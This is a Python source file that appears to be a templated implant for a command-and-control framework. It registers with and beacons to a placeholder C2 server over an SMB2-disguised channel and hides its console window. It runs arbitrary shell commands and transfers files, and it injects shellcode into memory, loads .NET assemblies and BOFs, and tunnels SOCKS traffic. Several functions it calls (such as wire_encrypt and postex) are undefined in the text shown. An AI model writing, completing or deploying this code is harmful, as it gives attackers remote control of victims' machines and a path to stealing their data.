#!/usr/bin/env python3
import json, platform, subprocess, os, getpass, socket, base64, sys, time, random, struct, hashlib

SERVER_HOST = "{{C2_HOST}}"
SERVER_PORT = {{C2_PORT}}
BEACON_INTERVAL = {{BEACON_INTERVAL}}
BEACON_JITTER = {{BEACON_JITTER}}
ENCRYPTION_KEY = b"{{ENCRYPTION_KEY}}"

def sleep_mask(seconds):
    import os
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    src = b'sockpuppets-sleep-mask'
    try:
        key = os.urandom(32)
        nonce = os.urandom(12)
        ct = AESGCM(key).encrypt(nonce, src, b'sockpuppets-sleep-mask-v1')
    except Exception:
        time.sleep(seconds)
        return
    time.sleep(seconds)
    try:
        AESGCM(key).decrypt(nonce, ct, b'sockpuppets-sleep-mask-v1')
    except Exception:
        pass

def stealth_sleep(seconds):
    secret = bytearray(ENCRYPTION_KEY)
    try:
        globals()['sleep_encrypt'](seconds, secret)
        return
    except Exception:
        sleep_mask(seconds)
SMB2 = b'\xfeSMB'
FILE_REQ = 0x10
FILE_RESP = 0x20

def _key():
    from cryptography.hazmat.primitives.kdf.hkdf import HKDF
    from cryptography.hazmat.primitives import hashes
    return HKDF(algorithm=hashes.SHA256(), length=32, salt=b'sockpuppets-salt-v1', info=b'sockpuppets-aes-256-gcm-v1').derive(ENCRYPTION_KEY)

def simple_encrypt(data: str) -> str:
    return wire_encrypt(data)

def simple_decrypt(data: str) -> str:
    return wire_decrypt(data)

def _hdr(command, message_id, session_id=0, tree_id=0):
    return struct.pack('<4sHHIHHIIQII8s16s', SMB2, 64, 0, 0, command, 1, 1, 0, message_id, 0, tree_id, session_id.to_bytes(8, 'little'), b'\x00'*16)

def _frame(body):
    return b'\x00' + struct.pack('>I', len(body))[1:] + body

def _unframe(buf):
    if len(buf) < 4:
        return None, buf
    length = int.from_bytes(buf[1:4], 'big')
    if len(buf) < 4 + length:
        return None, buf
    return buf[4:4+length], buf[4+length:]

def exchange(payload: str) -> str:
    sock = socket.create_connection((SERVER_HOST, SERVER_PORT), timeout=8)
    sock.settimeout(8)
    def rpc(body):
        sock.sendall(_frame(body))
        buf = b''
        while True:
            buf += sock.recv(65536)
            msg, buf = _unframe(buf)
            if msg:
                return msg
    rpc(_hdr(0, 1) + struct.pack('<HHHHI16sQ', 36, 1, 1, 0, 0, b'\x11'*16, 0) + struct.pack('<H', 0x0210))
    rpc(_hdr(1, 2) + struct.pack('<HBBIIHHQ', 25, 0, 0, 0, 0, 88, 1, 0) + b'\x00')
    rpc(_hdr(3, 3, session_id=0x1000) + struct.pack('<HHH', 9, 72, 8) + 'C2'.encode('utf-16le'))
    name = 'req'.encode('utf-16le')
    create = bytearray(64)
    struct.pack_into('<H', create, 0, 57)
    struct.pack_into('<HH', create, 44, 128, len(name))
    rpc(_hdr(5, 4, session_id=0x1000, tree_id=1) + bytes(create) + name)
    blob = payload.encode()
    write = bytearray(48) + blob
    struct.pack_into('<H', write, 0, 49)
    struct.pack_into('<H', write, 2, 112)
    struct.pack_into('<I', write, 4, len(blob))
    write[16:32] = FILE_REQ.to_bytes(16, 'little')
    rpc(_hdr(9, 5, session_id=0x1000, tree_id=1) + bytes(write))
    read = bytearray(49)
    struct.pack_into('<H', read, 0, 49)
    struct.pack_into('<I', read, 4, 1024*1024)
    read[16:32] = FILE_RESP.to_bytes(16, 'little')
    reply = rpc(_hdr(8, 6, session_id=0x1000, tree_id=1) + bytes(read))
    sock.close()
    data_off, length = struct.unpack_from('<HI', reply, 66)
    return reply[data_off:data_off+length].decode()

_socks_connections = {}

def _handle_socks_command(cmd_data, pending_results):
    cmd_type = cmd_data.get('type', '')
    conn_id = cmd_data.get('conn_id', '')
    if cmd_type == 'socks_init':
        return
    if cmd_type == 'socks_connect':
        host = cmd_data.get('host', '')
        port = cmd_data.get('port', 0)
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((host, port))
            sock.setblocking(False)
            _socks_connections[conn_id] = sock
            pending_results.append({'type': 'socks_connect_ack', 'conn_id': conn_id, 'success': True})
        except Exception:
            pending_results.append({'type': 'socks_connect_ack', 'conn_id': conn_id, 'success': False})
        return
    if cmd_type == 'socks_send':
        sock = _socks_connections.get(conn_id)
        if sock:
            try:
                raw = base64.b64decode(cmd_data.get('data', ''))
                sock.setblocking(True)
                sock.settimeout(5)
                sock.sendall(raw)
            except Exception:
                pending_results.append({'type': 'socks_close', 'conn_id': conn_id})
                _socks_close(conn_id)
        return
    if cmd_type == 'socks_close':
        _socks_close(conn_id)
        return

def _socks_close(conn_id):
    sock = _socks_connections.pop(conn_id, None)
    if sock:
        try:
            sock.close()
        except Exception:
            pass

def _drain_socks_data(pending_results):
    for conn_id, sock in list(_socks_connections.items()):
        try:
            sock.setblocking(False)
            data = b''
            closed = False
            while True:
                try:
                    chunk = sock.recv(4096)
                    if not chunk:
                        closed = True
                        break
                    data += chunk
                except (BlockingIOError, OSError):
                    break
            if data:
                pending_results.append({'type': 'socks_data', 'conn_id': conn_id, 'data': base64.b64encode(data).decode()})
            if closed:
                pending_results.append({'type': 'socks_close', 'conn_id': conn_id})
                _socks_close(conn_id)
        except Exception:
            pending_results.append({'type': 'socks_close', 'conn_id': conn_id})
            _socks_close(conn_id)


def _handle_bof(command: str) -> str:
    import base64, tempfile, os
    parts = command.split(':', 3)
    if len(parts) < 4:
        return 'Error: invalid BOF format (expected __bof:entry:args_b64:bof_data)'
    entry = parts[1]
    args_b64 = parts[2]
    bof_b64 = parts[3]
    try:
        bof_data = base64.b64decode(bof_b64)
        args_data = base64.b64decode(args_b64) if args_b64 else b''
    except Exception as e:
        return f'Error: base64 decode failed: {e}'
    tmp = tempfile.mktemp(suffix='.o')
    try:
        with open(tmp, 'wb') as f:
            f.write(bof_data)
        try:
            from bof import run_bof
            return run_bof(tmp, entry, args_data)
        except ImportError:
            pass
        if sys.platform == 'win32':
            result = subprocess.run(['rundll32', tmp, entry], capture_output=True, text=True, timeout=30)
            return result.stdout + result.stderr
        return f'BOF received ({len(bof_data)} bytes) but no BOF loader available'
    except Exception as e:
        return f'BOF error: {e}'
    finally:
        try:
            os.unlink(tmp)
        except Exception:
            pass


def _handle_fs(command: str) -> str:
    if command.startswith('__fs:ls:'):
        path = command[8:] or '.'
        try:
            entries = []
            for name in os.listdir(path):
                full = os.path.join(path, name)
                try:
                    st = os.stat(full)
                    prefix = 'd' if os.path.isdir(full) else '-'
                    entries.append(f"{prefix} {st.st_size:>12}  {name}")
                except OSError:
                    entries.append(f"? {'?':>12}  {name}")
            return '\n'.join(entries) if entries else 'Directory is empty'
        except Exception as e:
            return f"Error: {e}"
    if command.startswith('__fs:get:'):
        path = command[9:]
        if not os.path.isfile(path):
            return 'Error: not a file'
        if os.path.getsize(path) > 2 * 1024 * 1024:
            return 'Error: file too large (>2MB)'
        return 'FILE:' + base64.b64encode(open(path, 'rb').read()).decode()
    if command.startswith('__fs:put:'):
        rest = command[9:]
        path, _, b64 = rest.partition('\t')
        data = base64.b64decode(b64)
        parent = os.path.dirname(path)
        if parent:
            os.makedirs(parent, exist_ok=True)
        with open(path, 'wb') as f:
            f.write(data)
        return f'uploaded {len(data)} bytes to {path}'
    return 'Error: unknown fs command'


def _handle_shinject(command: str) -> str:
    import ctypes, threading
    sc_b64 = command.split(':', 1)[1] if ':' in command else ''
    try:
        sc = base64.b64decode(sc_b64)
    except Exception as e:
        return f'Error: base64 decode failed: {e}'
    if not sc:
        return 'Error: empty shellcode'
    try:
        if sys.platform == 'win32':
            k32 = ctypes.windll.kernel32
            ptr = k32.VirtualAlloc(0, len(sc), 0x3000, 0x40)
            if not ptr:
                return 'Error: VirtualAlloc failed'
            ctypes.memmove(ptr, sc, len(sc))
            ht = k32.CreateThread(0, 0, ptr, 0, 0, 0)
            if not ht:
                return 'Error: CreateThread failed'
            return f'Shellcode injected: {len(sc)} bytes, thread handle={ht}'
        else:
            import mmap
            mm = mmap.mmap(-1, len(sc), prot=mmap.PROT_READ | mmap.PROT_WRITE | mmap.PROT_EXEC)
            mm.write(sc)
            cfunc = ctypes.CFUNCTYPE(ctypes.c_void_p)(ctypes.addressof(ctypes.c_char.from_buffer(mm)))
            t = threading.Thread(target=cfunc)
            t.daemon = True
            t.start()
            return f'Shellcode injected: {len(sc)} bytes (Linux/mmap)'
    except Exception as e:
        return f'Shellcode injection error: {e}'


def _handle_asm(command: str) -> str:
    if sys.platform != 'win32':
        return 'Error: execute-assembly is Windows-only'
    parts = command.split(':', 2)
    args_str = parts[1] if len(parts) > 1 else ''
    asm_b64 = parts[2] if len(parts) > 2 else ''
    try:
        asm_data = base64.b64decode(asm_b64)
    except Exception as e:
        return f'Error: base64 decode failed: {e}'
    if not asm_data:
        return 'Error: empty assembly'
    try:
        import clr
        import System
        from System.Reflection import Assembly
        asm_bytes = System.Array[System.Byte](asm_data)
        assembly = Assembly.Load(asm_bytes)
        entry = assembly.EntryPoint
        if not entry:
            return 'Error: assembly has no entry point'
        argv = args_str.split() if args_str else []
        params = entry.GetParameters()
        if len(params) == 1:
            args_array = System.Array[System.String](argv)
            result = entry.Invoke(None, System.Array[System.Object]([args_array]))
        else:
            result = entry.Invoke(None, None)
        return f'Assembly executed: {result}' if result else 'Assembly executed (no output)'
    except ImportError:
        return f'Error: execute-assembly requires pythonnet (clr module). Assembly received: {len(asm_data)} bytes'
    except Exception as e:
        return f'Assembly execution error: {e}'


def execute_command(command: str) -> str:
    if str(command).startswith('__hd:'):
        return hidden_desktop(command)
    if str(command).startswith('__px:'):
        return postex(command)
    if str(command).startswith('__bof:'):
        return _handle_bof(command)
    if str(command).startswith('__fs:'):
        return _handle_fs(command)
    if str(command).startswith('__shinject:'):
        return _handle_shinject(command)
    if str(command).startswith('__asm:'):
        return _handle_asm(command)
    if command == '__kill':
        sys.exit(0)
    if command == '__dormant':
        return '__dormant__'
    if command.startswith('__set_interval:'):
        return '__set_interval__'
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
        return (result.stdout + result.stderr) or 'Command executed successfully (no output)'
    except Exception as e:
        return f'Error: {e}'

def connect_to_server():
    agent_id = None
    pending = []
    beacon_interval = BEACON_INTERVAL
    dormant = False
    while True:
        try:
            if dormant:
                stealth_sleep(beacon_interval)
                continue
            if not agent_id:
                meta = {'hostname': socket.gethostname(), 'username': getpass.getuser(), 'os': platform.system(), 'mode': 'beacon', 'beacon_interval': beacon_interval}
                reply = json.loads(simple_decrypt(exchange(simple_encrypt(json.dumps({'type': 'register', 'metadata': meta})))))
                agent_id = reply.get('agent_id') or None
                if not agent_id:
                    stealth_sleep(5)
                    continue
            msg = {'type': 'checkin', 'agent_id': agent_id, 'metadata': {'mode': 'beacon', 'beacon_interval': beacon_interval, 'hostname': socket.gethostname()}, 'results': pending}
            pending = []
            data = json.loads(simple_decrypt(exchange(simple_encrypt(json.dumps(msg)))))
            if data.get('type') == 'registered':
                agent_id = data.get('agent_id')
                continue
            for cmd in data.get('commands') or []:
                command = cmd.get('command', '')
                if command == '__kill':
                    sys.exit(0)
                if command:
                    output = execute_command(command)
                    if output == '__dormant__':
                        dormant = True
                        pending.append({'type': 'response', 'command': command, 'output': 'Agent entering dormant mode', 'timestamp': time.strftime('%Y-%m-%dT%H:%M:%S')})
                        continue
                    if output == '__set_interval__':
                        try:
                            new_interval = int(command.split(':', 1)[1])
                            beacon_interval = new_interval
                            pending.append({'type': 'response', 'command': command, 'output': f'Beacon interval set to {new_interval}s', 'timestamp': time.strftime('%Y-%m-%dT%H:%M:%S')})
                        except (ValueError, IndexError):
                            pending.append({'type': 'response', 'command': command, 'output': 'Error: invalid interval', 'timestamp': time.strftime('%Y-%m-%dT%H:%M:%S')})
                        continue
                    pending.append({'type': 'response', 'command': command, 'output': output, 'timestamp': time.strftime('%Y-%m-%dT%H:%M:%S')})
            stealth_sleep(beacon_interval)
        except Exception:
            stealth_sleep(5)

if __name__ == '__main__':
    if sys.platform == 'win32':
        try:
            import ctypes
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except Exception:
            pass
    while True:
        try:
            connect_to_server()
            break
        except KeyboardInterrupt:
            break
        except Exception:
            time.sleep(10)
